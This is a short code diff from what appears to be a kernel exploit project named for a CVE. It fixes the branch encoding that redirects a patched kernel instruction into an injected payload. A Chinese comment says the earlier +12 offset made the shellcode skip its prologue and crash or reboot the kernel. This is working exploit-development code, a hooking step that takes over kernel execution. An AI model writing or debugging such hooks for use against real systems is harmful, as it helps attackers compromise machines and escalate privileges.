@@ -79,7 +79,12 @@ namespace ghostlock::backend::cve_2026_43284::hook {
 
     SentryError hook_branch(const SentryPlan &plan, std::uint32_t &out) noexcept {
         const std::uint64_t entry = plan.payload_vaddr + plan.entry_offset;
-        if (!encode_branch(plan.hook_vaddr + 12U, entry, out)) {  /* the branch sits twelve bytes into the site */
+        /*
+         * 参考（dev shellcode.cpp:255）是 encode_branch(target.hook_vaddr, payload_vaddr + entry_offset)，
+         * 即**从站点本身起算** —— 站点那个字被替换，回跳目标是 site+4（shellcode.cpp:261）✓。
+         * 我曾误加 +12U，使目标变成 entry+12，载荷从 prologue 之后开始跑 ⇒ 崩 ⇒（init 调用则）内核重启。
+         */
+        if (!encode_branch(plan.hook_vaddr, entry, out)) {
             return SentryError::BranchOutOfRange;
         }
         return SentryError::Ok;
